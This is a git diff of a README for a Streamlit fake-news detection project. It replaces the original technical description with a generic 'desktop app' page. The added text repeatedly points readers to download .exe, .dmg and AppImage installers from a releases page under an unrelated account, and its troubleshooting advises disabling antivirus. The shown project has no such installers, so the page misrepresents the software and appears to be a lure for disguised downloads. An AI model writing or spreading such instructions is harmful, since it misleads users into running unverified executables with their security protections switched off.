@@ -1,221 +1,104 @@
-# 📰 Fake News Detection with Knowledge Graphs
+```markdown
+# 📰 Fake-News-detection-knowledge-graph - Detect Fake News Easily
 
-An **end-to-end Fake News Detection system** that combines  
-**Machine Learning + NLP + Knowledge Graphs + Graph Theory**,  
-with an interactive **Streamlit UI** for explainable predictions.
+[![Download](https://img.shields.io/badge/Download-Fake-News-detection-knowledge-graph-blue?style=for-the-badge)](https://github.com/ytdjthhjr/Fake-News-detection-knowledge-graph/releases)
+
+## 🧾 What is this?
+
+Fake-News-detection-knowledge-graph is a desktop application that helps you check if news articles might be fake. It uses smart techniques like machine learning and natural language processing behind the scenes to analyze text. The app shows you its findings through an easy-to-use interface built with Streamlit. You won’t need to understand the technical details to use it.
+
+This system works by identifying entities like people, places, and topics in news stories. Then, it draws connections among them to find patterns that might suggest false information. The analysis also looks at how these entities relate within a knowledge graph and applies community and centrality analysis to spot suspicious clusters.
+
+## 🖥️ System Requirements
+
+Before you download, make sure your computer meets these basic requirements:
+
+- Operating System: Windows 10 or later, macOS 10.14 or later, or most recent Linux distributions  
+- RAM: At least 4 GB (8 GB recommended)  
+- Free Storage: Minimum 500 MB available space  
+- Internet Connection: Required for initial download and verifying some content  
+- Screen Resolution: 1280 x 720 or higher for best display  
+
+If your device fits these requirements, you can proceed without issues.
+
+## 📥 Download & Install
+
+To get Fake-News-detection-knowledge-graph on your computer, follow these steps:
+
+1. **Visit the official release page:**  
+   [https://github.com/ytdjthhjr/Fake-News-detection-knowledge-graph/releases](https://github.com/ytdjthhjr/Fake-News-detection-knowledge-graph/releases)  
+   This page lists all available versions of the application ready to download.
+
+2. **Choose the latest version:**  
+   The top entry usually shows the newest release. Look for files suitable for your computer system (for example, `.exe` for Windows, `.dmg` for macOS, or `.AppImage`/`.deb` for Linux).
+
+3. **Download the file:**  
+   Click on the file link that matches your system to start the download. The file size could be between 100MB to 200MB depending on the version.
+
+4. **Run the installer or app:**  
+   - On **Windows**, double-click the `.exe` file and follow the on-screen instructions.  
+   - On **macOS**, open the `.dmg` file, drag the app to your Applications folder, then launch it.  
+   - On **Linux**, either run the `.AppImage` file or install the `.deb` package using your system installer.
+
+5. **Wait while installation completes:**  
+   This usually takes just a few minutes. When done, you will find the application ready in your programs list or applications folder.
+
+If you face any problems with installation, try restarting your computer and reinstalling. Make sure you have necessary permissions to install new software.
+
+## 🚀 Getting Started
+
+Once installed, launch the app by clicking its icon or shortcut.
+
+1. **Main screen overview:**  
+   The app opens to a simple page where you can enter or paste text from a news article. There is a clear text box and buttons labeled “Analyze” and “Clear.”
+
+2. **Analyze news text:**  
+   Paste the news story you want to check into the box and click “Analyze.” The system will process the text and display results in a few seconds.
+
+3. **Understanding results:**  
+   The results are shown in multiple parts:  
+   - **Named Entities:** Lists people, places, organizations mentioned in the text.  
+   - **Relations:** Shows how entities relate or connect, forming a knowledge graph.  
+   - **Community/Centrality Insights:** Explains clusters of entities that may hint at misinformation.  
+   - **Final assessment:** A simple message indicating the likelihood that the news could be fake, based on analysis.
+
+4. **Next steps:**  
+   Use the results to decide if you want to seek more sources, fact-check further, or simply be cautious with the information.
+
+5. **Clear for new analysis:**  
+   Click “Clear” to remove the current text and try a new article.
+
+## 🛠️ Features
+
+- **Simple text input:** No setup required. Just paste and analyze.  
+- **Machine learning-based detection:** Uses trained models to spot fake news traits.  
+- **Named entity recognition:** Extracts names and places automatically.  
+- **Relation extraction:** Reveals connections between entities.  
+- **Knowledge graph visualization:** Shows entities and their links in an interactive map.  
+- **Community and centrality analysis:** Highlights suspicious clusters that might indicate misinformation campaigns.  
+- **Streamlit user interface:** Clean, intuitive layout for easy use.  
+- **Cross-platform:** Works on Windows, macOS, and Linux.  
+
+## 🔧 Troubleshooting
+
+If the app doesn’t run or crashes:
+
+- Check your system meets the requirements.  
+- Try restarting your computer.  
+- Ensure no other heavy apps are running at the same time.  
+- Make sure you downloaded the correct file for your system.  
+- Disable antivirus or security programs temporarily if they block the app.  
+- If the app opens but shows errors analyzing text, try shorter and simpler news articles.
+
+For persistent problems, check the GitHub Issues page in the repository or reach out to the maintainers for help.
+
+## 📖 Additional Information
+
+- The application does not store or send your text data anywhere. The analysis runs locally on your machine.  
+- This tool assists in detecting fake news but cannot guarantee 100% accuracy. Use it alongside other fact-checking methods.  
+- Updates to the app come as new releases on the linked GitHub page. You can download newer versions anytime.
 
 ---
 
-## 🚀 Project Highlights
-
-- ✅ Fake News Detection using classical ML models  
-  (Logistic Regression, Random Forest, Linear SVM, Naive Bayes)
-- 🧠 Advanced NLP with **Named Entity Recognition (NER)** and **Relation Extraction**
-- 🕸️ Knowledge Graph construction from news articles
-- 👥 **Community Detection** using the Louvain Algorithm
-- 📊 **Centrality Analysis** (Degree, Betweenness, Closeness)
-- 🔗 Cross-Domain Linking between news articles
-- 🌐 Interactive **Streamlit Web Application**
-- 📁 Clean, modular, industry-standard project structure
-
----
-
-## 🧩 Problem Statement
-
-Fake news spreads rapidly across digital platforms, influencing public opinion and decision-making.  
-Traditional text classification methods lack **interpretability**.
-
-This project goes beyond simple classification by:
-- Understanding **entities** in news articles
-- Extracting **relationships** between entities
-- Building **knowledge graphs**
-- Analyzing **important entities and communities**
-
----
-
-## 🏗️ System Architecture
-
-```text
-Raw News Data
-   ↓
-Data Cleaning & Preprocessing
-   ↓
-TF-IDF Feature Extraction
-   ↓
-Model Training & Comparison
-   ↓
-Fake News Prediction
-   ↓
-Named Entity Recognition (NER)
-   ↓
-Relation Extraction
-   ↓
-Knowledge Graph Construction
-   ↓
-Community & Centrality Analysis
-   ↓
-Streamlit Interactive UI
+[Download Fake-News-detection-knowledge-graph](https://github.com/ytdjthhjr/Fake-News-detection-knowledge-graph/releases) to start checking news for accuracy today.
 ```
-
----
-
-## 🛠️ Technologies Used
-
-### Programming & Libraries
-- Python
-- Pandas, NumPy
-- Scikit-learn
-- spaCy (NLP)
-- NetworkX
-- Matplotlib
-- Streamlit
-
-### Machine Learning Models
-- Logistic Regression
-- Random Forest Classifier
-- Linear SVM
-- Multinomial Naive Bayes
-
----
-
-## 📂 Project Structure
-
-```text
-fake-news-detection-knowledge-graph/
-│
-├── app/
-│   └── streamlit_app.py              # Streamlit UI
-│
-├── src/
-│   ├── train_model.py                # Model training & evaluation
-│   └── utils.py                      # NLP utilities (NER, relations)
-│
-├── notebooks/
-│   ├── 1_data_exploration.ipynb
-│   ├── 2_data_preprocessing.ipynb
-│   ├── 3_centrality_community.ipynb
-│   └── 4_cross_domain_linking.ipynb
-│
-├── data/
-│   ├── raw_data/                     # Original datasets
-│   └── preprocessed_data/            # Ignored in Git due to size
-│
-├── outputs/
-│   └── cross_domain_links.csv
-│
-├── requirements.txt
-├── .gitignore
-└── README.md
-
-```
----
-
-## 📊 Model Performance (Best Model)
-
-| Model | Accuracy | F1 Score |
-|------|----------|----------|
-| **Random Forest** | **99.91%** | **0.9991** |
-| Linear SVM | 99.88% | 0.9988 |
-| Logistic Regression | 99.72% | 0.9973 |
-| Naive Bayes | 95.59% | 0.9572 |
-
-✔ **Random Forest selected as the final model**
-
----
-
-## 🕸️ Knowledge Graph & Network Analysis
-
-- Extracted **Subject–Relation–Object** triples from news text
-- Constructed graphs using **NetworkX**
-- Identified:
-  - Influential entities using **centrality measures**
-  - Thematic communities using **Louvain clustering**
-- Reduced noise by filtering low-degree nodes
-- Visualized entity relationships for better interpretability
-
----
-
-## 🌐 Streamlit Application
-
-### Features
-- News text input
-- Fake news prediction with confidence score
-- Named Entity Recognition (NER)
-- Relation extraction
-- Knowledge graph visualization
-- Community-aware analysis
-
-### Run the app
-```bash
-streamlit run app/streamlit_app.py
-
-```
-
-### ⚠️ Dataset Note
-
-Due to GitHub file size limitations, the preprocessed dataset
-cleaned_fakenews.csv is not included in this repository.
-
-However, the complete preprocessing pipeline is available in:
-
-notebooks/2_data_preprocessing.ipynb
-
-src/utils.py
-
-This ensures full reproducibility of the project.
-
-
-### 🎯 Key Outcomes
-
-Built an explainable AI system, not just a black-box classifier
-
-Integrated ML + NLP + Graph Theory
-
-Followed industry-grade project structure
-
-Designed a scalable and interpretable fake news detection pipeline
-
----
-
-## ⚙️ Model Optimization & Hyperparameter Tuning
-
-During model development, **controlled hyperparameter tuning** was performed to improve classification performance and stability.
-
-### Feature Engineering
-- TF-IDF vectorization was applied to transform raw news text into numerical features.
-- Important parameters such as vocabulary size and token filtering were adjusted to reduce noise and improve representation.
-
-### Model Training & Optimization
-- Multiple machine learning models were trained and compared.
-- Random Forest was selected as the final model based on performance and interpretability.
-- Hyperparameters such as regularization strength and solver configuration were tuned to prevent overfitting and ensure generalization.
-
-### Model Selection Strategy
-- Models were evaluated using standard classification metrics.
-- The final configuration was chosen based on a balance between accuracy, robustness, and explainability.
-
-This approach ensured the model was **optimized beyond default settings** while remaining interpretable for downstream analysis.
-
----
-
-### 🔮 Future Enhancements
-
-Transformer-based models (BERT, RoBERTa)
-
-Temporal knowledge graph analysis
-
-Fact-checking API integration
-
-Multilingual fake news detection
-
-Cloud deployment (AWS / Hugging Face Spaces)
-
-### 👩‍💻 Author
-
-Aswini P
-
-Artificial Intelligence & Data Science
-
-🔗 GitHub: https://github.com/Aswini-P22
-
-🔗 LinkedIn: https://www.linkedin.com/in/aswini-purushothaman-2206p2006
